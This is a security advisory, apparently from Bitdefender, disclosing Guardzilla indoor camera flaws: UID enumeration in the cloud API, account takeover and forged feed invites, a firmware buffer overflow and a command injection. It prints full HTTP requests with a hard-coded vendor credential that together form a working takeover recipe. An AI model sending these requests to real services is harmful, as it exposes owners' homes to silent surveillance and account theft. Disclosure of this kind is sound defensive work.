@@ -1,0 +1,87 @@
+Vulnerabilities in indoor security camera allows remote compromise and device takeover
+The commodification of IoT devices has paved the way to the smart home. Interconnected appliances, intelligent assistants and smart home surveillance are just some applications of the Internet of Things and customers love it.
+The large number of intelligent, remotely controllable devices has opened the door not only to new opportunities. They have also unlocked new opportunities for cyber-criminals to establish a foothold into the customers’ smart homes.
+As a global cybersecurity solutions provider in the IoT space, Bitdefender does extensive research into vulnerabilities that affect intelligent devices and releases reports to help both customers understand risks in the connected home, as well as drive security awareness in the vendor space.
+Our latest research focuses on the Guardzilla Indoor Security Camera, an extremely affordable and popular surveillance device whose primary focus is providing physical security against break-in. While the feature set is highly appreciated by its users, the security implementation features several vulnerabilities that can be remotely exploited by ill-intended parties. We have identified several vulnerabilities that can be leveraged to totally compromise the camera, which results in a severe privacy impact on the user side.
+NOTE: Bitdefender understands the importance of responsible vulnerability disclosure and we have contacted the affected vendor before publishing this whitepaper. In early September, the Bitdefender team notified the vendor about the issues described in this whitepaper but did not get any response. As our 90-day vulnerability disclosure has expired in early December, we decided to extend it further. However, given that some of the vulnerabilities we have come across are now surfacing, we are now releasing the full information on the identified vulnerabilities, as well as guidance for consumers. Please note that, as of the moment of writing, the vulnerabilities discovered are still present in the firmware.
+Disclosure timeline
+Aug 28, 2018: Bitdefender makes initial contact with vendor, requesting a PGP Key or a secure channel for private disclosure. Bitdefender did not receive an acknowledgement of the request.
+Sept 05, 2018: Bitdefender follows up to the initial request, but no response is received this time either.
+Oct 23, 2018: Bitdefender reserves CVE-2018-18600, CVE-2018-18601, CVE-2018-18602 in preparation for publication. They are granted within the same day.
+Dec 27, 2018: 0DayAlley releases information about an unrelated vulnerability in the camera.
+Dec 28, 2018: Bitdefender publicly releases this report
+Part 1: Bruteforcing the cloud API to Enumerate Users (CVE-2018-18602)
+The Guardzilla Security Camera comes with a mobile application that allows the owner to set up devices and monitor live feeds streamed by the already deployed cameras. The mobile app communicates with an API endpoint at https://apps.guardzilla.com.
+After authentication, the APP receives a unique ID (UID), which is then used as a token for all subsequent requests to the API. This UID is 6 digits long and is generated when registering a new account and it cannot be modified later. While registering our cameras, we noticed that this UID is not randomly generated, but rather it gets incremented by one for every new account created. Theoretically, this engineering decision allows us to access any account without knowing the associated credentials, by simply iterating through every possible UID combination.
+Now that the authentication part is out of the way, an attacker can use the API to obtain the list of cameras associated to a specific account. This can be done by passing the following POST request to the API endpoint.
+POST /api/account/cameralist HTTP/1.1
+Host: apps.guardzilla.com
+Content-Type: application/x-www-form-urlencoded
+{ “UserID” : “Guardzilla”, “Password” : “1a^38!v@”, “uid” : “[REDACTED]” }
+The UserID and the Password parameters are hard-coded and present into every request.The body of the POST requests sent to the cloud are encrypted with AES256 in CBC mode. The Key and the initialization vector are hard-coded into the application. The result is a base64 block with a “=” character prepended at the beginning.
+This request returns a JSON containing a list of cameras associated with the account including their password and d_uid (device ID). This information is highlighted in the request below (UID is the device ID in this case).
+Response:
+{
+“UserID”:XXXXXX,
+“HasPromo”:false,
+“StartDate”:0,
+“EndDate”:0,
+“CameraList”:[
+{
+“UserDeviceID”:0,
+“DeviceID”:[REDACTED],
+“UserID”:[REDACTED],
+“UID”:”[REDACTED]”,
+“CameraType”:2,
+“Name”:”camera”,
+“Password”:”[REDACTED]”,
+“PushEnabled”:false,
+“TextEnabled”:false,
+“EmailEnabled”:false,
+“SirenEnabled”:false,
+“AutoArmEnabled”:false,
+“ArmingDelay”:0,
+“MotionSensitivity”:0.0,
+“SoundSensitivity”:0.0,
+“TimezoneOffset”:0,
+“FirmwareVersion”:null,
+“ModelNumber”:null,
+“Latitude”:null,
+“Longitude”:null,
+“IsShared”:true,
+“ListOrder”:1,
+“Orientation”:1,
+“HasInvites”:false
+}
+]}
+With this information already available, changing a user email and password is relatively as simple as passing a POST request to the API endpoint, as shown below:
+POST /api/account/updateuser HTTP/1.1
+Host: apps.guardzilla.com
+Content-Type: application/x-www-form-urlencoded
+{ “UserID” : “Guardzilla”, “Password” : “1a^38!v@”, “uid” : “[REDACTED]”, “email” : “newemail@example.com”, “pass” : “newpassword”, “phone” : “”, “mcc” : “1” }
+{“ErrorMsg”:””,”UserID”:
+An attacker has to pass the desired email and pass parameters and submit the request for the change to happen.
+This request can be used to completely take over an account by changing the associated email and password to arbitrary values. The new email does not have to exist, as no confirmation email is sent for verification. The old credentials become invalidated once the new ones get submitted.
+Sharing the camera on behalf of the victim
+The legitimate owner of the camera can send others invites to watch the video feed in real time. However, an attacker can forge these invites by referencing the account uid and the device’s d_uid (both obtained earlier). The original owner is unaware that somebody else has access to the camera feed.
+POST /api/account/sendinvite HTTP/1.1
+Host: apps.guardzilla.com
+Content-Type: application/x-www-form-urlencoded
+{ “UserID” : “Guardzilla”, “Password” : “1a^38!v@”, “uid” : “[REDACTED]”, “d_uid” : “[REDACTED]”, “email” : “invitedemail@example.com” }
+Response:
+{“UserID”:0,”MobileDeviceID”:0,”ErrorMsg”:”Success”,”CameraList”:[],”InviteList”:[],”HasCameraPermission”:false}
+This technique can grant anyone access to the security camera’s feed silently and poses a serious threat to the privacy of the users in the surveilled space.
+Part 2: Buffer Overflows in the GZ621W Camera Firmware (CVE-2018-18601)
+Guardzilla is a cloud-powered camera that uses the the Kalay Platform (https://www.tutk.com/) to communicate with the cloud. In order to bypass restrictions imposed by NAT setups, it uses a combination of P2Pand relay servers.
+For instance, in order to access a device remotely, a 20 bytes UID (the same d_uid from above), a username and a password is needed. Both the UID and the password can be obtained from the API endpoint, while the username is by default admin. Our research shows that there is no way to change the username.
+By examining the cloud communication component, we identified a function called TK_set_deviceModel_req_handle that is vulnerable to out of bound writes. By sending a specially crafted buffer over the cloud communication, we can achieve remote code execution.
+This exploit works on camera model GZ621W with a firmware version of 0.5.1.4 ( which seems to be the latest available version, according to the application). Other models may be affected.
+Part 3: Command Injection in the GZ180 Model (CVE-2018-18600)
+The GZ180 camera is also affected by a command injection vulnerability in the remote upgrade feature that allows a potential hijacker to obtain shell access to the device and execute system commands on it.
+The remote update function takes two parameters: the first one is the new firmware version, while the latter is the download location for the new binary.
+The firmware version is concatenated to tar as an argument, and then it is executed through a system command. For this to work, the firmware location must be a valid URL reachable by the camera (for example, www.example.com). The current firmware will not be affected, as the upgrade fails when the new image is invalid.
+Throughout the process, the camera remains functional and accessible, but it will not accept another upgrade command until reboot. This functionality can be leveraged over the cloud by simply knowing the device UID and associated password.
+Impact
+By enumerating through all possible uid values, an attacker can obtain and modify account information, and access all the cameras associated to the respective accounts, without having – or needing – the proper credentials. After obtaining the camera UID (d_uid) and the camera password, an attacker could access the camera feed remotely, or exploit the vulnerability that allows for remote code execution.
+The popularity of this camera is enough to make it an appealing target for cyber-criminals. According to Google Play Store, the camera app’s install base is somewhat north of 100.000 downloads, not counting the potential Apple users. Our own research shows that the latest UID received is 410,000, which is probably reflecting the number of devices activated around the world.
+As of the moment of writing, the vulnerabilities in the cloud API and firmware are still present. While some attack avenues can be plugged using a security solution for the Internet of Things such as the Bitdefender BOX, the user enumeration flaw in the product’s cloud-based API cannot be mitigated without the vendor’s intervention.
